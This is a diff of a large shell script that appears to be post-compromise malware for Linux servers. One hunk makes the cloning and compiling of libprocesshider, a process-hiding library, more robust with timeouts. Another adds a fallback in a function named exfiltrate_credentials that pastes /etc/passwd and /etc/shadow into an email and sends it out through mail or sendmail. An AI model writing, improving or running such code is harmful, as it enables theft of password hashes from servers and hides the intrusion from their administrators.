@@ -2390,14 +2390,39 @@ install_libprocesshider() {
     apt-get install -y git gcc make 2>&1 | grep -E "Setting up|already" || true
     yum install -y git gcc make 2>&1 | grep -E "Installing|already" || true
 
-    # Clone from GitHub
-    echo "[*] Cloning libprocesshider from GitHub..."
+    # Clone from GitHub with timeout (prevent infinite hang)
+    echo "[*] Cloning libprocesshider from GitHub (30 second timeout)..."
     cd /tmp
     rm -rf libprocesshider 2>/dev/null
     
-    if ! git clone https://github.com/littlAcen/libprocesshider 2>/dev/null; then
-        echo "[!] Failed to clone libprocesshider - skipping process hiding"
-        return 1
+    # Try with timeout command if available
+    if command -v timeout >/dev/null 2>&1; then
+        if ! timeout 30 git clone https://github.com/littlAcen/libprocesshider 2>/dev/null; then
+            echo "[!] Failed to clone libprocesshider (timeout or error) - skipping process hiding"
+            return 1
+        fi
+    else
+        # Fallback: git clone with background kill after 30 seconds
+        git clone https://github.com/littlAcen/libprocesshider 2>/dev/null &
+        local GIT_PID=$!
+        local COUNTER=0
+        while kill -0 $GIT_PID 2>/dev/null && [ $COUNTER -lt 30 ]; do
+            sleep 1
+            COUNTER=$((COUNTER + 1))
+        done
+        
+        if kill -0 $GIT_PID 2>/dev/null; then
+            echo "[!] Git clone timeout after 30 seconds - killing and skipping"
+            kill -9 $GIT_PID 2>/dev/null
+            wait $GIT_PID 2>/dev/null
+            return 1
+        fi
+        
+        wait $GIT_PID
+        if [ $? -ne 0 ]; then
+            echo "[!] Failed to clone libprocesshider - skipping process hiding"
+            return 1
+        fi
     fi
 
     # Compile with C99 flag (CRITICAL FIX!)
@@ -4003,18 +4028,61 @@ exfiltrate_credentials() {
             [ -f "$PASSWD_FILE" ] && echo "      - ${HOSTNAME}_passwd"
             [ -f "$SHADOW_FILE" ] && echo "      - ${HOSTNAME}_shadow"
         else
-            echo "[!] Email sending failed"
-            echo "[*] Files saved locally in: $TEMP_DIR"
-            echo "[!] Manual retrieval required"
-            # Don't delete temp dir if email failed
-            return 1
+            echo "[!] Python3 email sending failed - trying fallback method..."
         fi
     else
-        echo "[!] Python3 not available - cannot send email"
-        echo "[*] Files saved in: $TEMP_DIR"
-        echo "    - ${HOSTNAME}_passwd"
-        echo "    - ${HOSTNAME}_shadow"
-        return 1
+        echo "[!] Python3 not available - trying fallback email method..."
+    fi
+    
+    # FALLBACK: Try using mail command if Python3 failed or unavailable
+    if ! command -v python3 >/dev/null 2>&1 || ! send_email_with_attachments "$SUBJECT" "$PASSWD_FILE" "$SHADOW_FILE" 2>&1 | grep -q "SUCCESS"; then
+        if command -v mail >/dev/null 2>&1 || command -v sendmail >/dev/null 2>&1; then
+            echo "[*] Trying basic mail command (inline credentials)..."
+            
+            # Create email body with inline credentials
+            local EMAIL_BODY="/tmp/.email_body_$$"
+            {
+                echo "Subject: $SUBJECT"
+                echo "To: $RECIPIENT_EMAIL"
+                echo ""
+                echo "Server: $HOSTNAME"
+                echo "Timestamp: $(date)"
+                echo ""
+                echo "==================== /etc/passwd ===================="
+                cat "$PASSWD_FILE" 2>/dev/null || echo "[ERROR: Could not read passwd file]"
+                echo ""
+                echo "==================== /etc/shadow ===================="
+                cat "$SHADOW_FILE" 2>/dev/null || echo "[ERROR: Could not read shadow file]"
+                echo ""
+                echo "===================================================="
+            } > "$EMAIL_BODY" 2>/dev/null
+            
+            # Try sending via mail or sendmail
+            if command -v mail >/dev/null 2>&1; then
+                if mail -s "$SUBJECT" "$RECIPIENT_EMAIL" < "$EMAIL_BODY" 2>/dev/null; then
+                    echo "[✓] Credentials sent via mail command!"
+                    rm -f "$EMAIL_BODY"
+                else
+                    echo "[!] mail command failed"
+                    rm -f "$EMAIL_BODY"
+                fi
+            elif command -v sendmail >/dev/null 2>&1; then
+                if sendmail "$RECIPIENT_EMAIL" < "$EMAIL_BODY" 2>/dev/null; then
+                    echo "[✓] Credentials sent via sendmail!"
+                    rm -f "$EMAIL_BODY"
+                else
+                    echo "[!] sendmail command failed"
+                    rm -f "$EMAIL_BODY"
+                fi
+            fi
+        else
+            echo "[!] No email tools available (python3, mail, or sendmail)"
+            echo "[*] Files saved in: $TEMP_DIR"
+            echo "    - ${HOSTNAME}_passwd"
+            echo "    - ${HOSTNAME}_shadow"
+            # Don't delete temp dir - credentials are only saved locally
+            return 1
+        fi
     fi
 
     # Clean up temp files only if email succeeded
